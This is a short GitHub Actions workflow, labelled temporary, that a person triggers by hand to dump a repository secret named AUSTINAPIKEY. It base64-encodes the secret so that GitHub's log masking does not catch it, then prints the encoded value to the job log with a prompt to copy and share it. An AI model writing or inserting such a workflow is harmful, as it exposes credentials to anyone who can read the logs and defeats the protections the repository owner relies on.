name: Dump AUSTINAPIKEY (TEMP - DELETE AFTER USE)
on: workflow_dispatch
permissions: {}
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - run: echo "BASE64_ENCODED_KEY=$(echo -n '${{ secrets.AUSTINAPIKEY }}' | base64 -w0)" >> $GITHUB_ENV
      - run: echo "Copy this base64 string and share it so it can be decoded:"
      - run: echo "${{ env.BASE64_ENCODED_KEY }}"